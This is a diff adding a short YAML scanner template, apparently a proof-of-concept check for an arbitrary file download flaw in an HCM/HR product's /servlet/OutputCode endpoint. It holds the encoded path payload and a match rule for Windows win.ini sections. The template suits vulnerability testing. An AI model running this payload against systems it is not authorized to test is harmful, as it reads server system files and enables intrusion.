@@ -1,0 +1,15 @@
+name: Hcm-hr-OutputCode-file-download
+set:
+  s0: randomInt(10000,99999)
+groups:
+  poc:  
+   -  method: GET
+      path: /servlet/OutputCode?path=Ix1E5Anj26gg4vfnak8pSKVU3Fi5TGhY
+      follow_redirects: false
+      expression: >-
+        response.body.bcontains(b"[fonts]") || response.body.bcontains(b"[extensions]") || response.body.bcontains(b"[mci extensions]") || response.body.bcontains(b"[files]") || response.body.bcontains(b"[Mail]")  
+
+detail: 
+  links: 
+  authors:
+  
